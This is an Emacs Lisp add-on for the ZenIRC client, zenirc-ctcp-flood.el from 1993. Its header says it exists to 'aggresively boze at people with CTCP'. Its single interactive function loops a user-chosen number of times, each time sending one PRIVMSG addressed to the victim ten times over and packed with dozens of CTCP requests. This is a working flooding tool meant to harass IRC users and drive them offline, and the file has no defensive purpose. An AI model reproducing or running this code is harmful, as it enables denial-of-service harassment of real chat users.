;;;
;;;
;;; zenirc-ctcp-flood.el --- aggresively boze at people with CTCP

;;; Copyright (C) 1993, 1994 Ben A. Mesander

;;; Author: Ben A. Mesander <ben@gnu.ai.mit.edu>
;;; Maintainer: ben@gnu.ai.mit.edu
;;; Keywords: extensions
;;; Created: 1993/06/03

;;; This program is free software; you can redistribute it and/or modify
;;; it under the terms of the GNU General Public License as published by
;;; the Free Software Foundation; either version 2, or (at your option)
;;; any later version.
;;;
;;; This program is distributed in the hope that it will be useful,
;;; but WITHOUT ANY WARRANTY; without even the implied warranty of
;;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;;; GNU General Public License for more details.
;;;
;;; You should have received a copy of the GNU General Public License
;;; along with this program; if not, you can either send email to this
;;; program's maintainer or write to: The Free Software Foundation,
;;; Inc.; 675 Massachusetts Avenue; Cambridge, MA 02139, USA.

;;; Commentary:

;;; Code:

(require 'zenirc)

(defun zenirc-ctcp-flood (target number)
  (interactive "sTarget: \nnNumber of times: ")
  (let ((i 0) (proc (get-buffer-process (current-buffer))))
    (while (< i number)
      (setq i (1+ i))
      (process-send-string
       proc (concat "PRIVMSG " target ","target ","target ","target ","target ","target ","target ","target ","target ","target " :\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\C-aA\C-a\n")))))

(provide 'zenirc-ctcp-flood)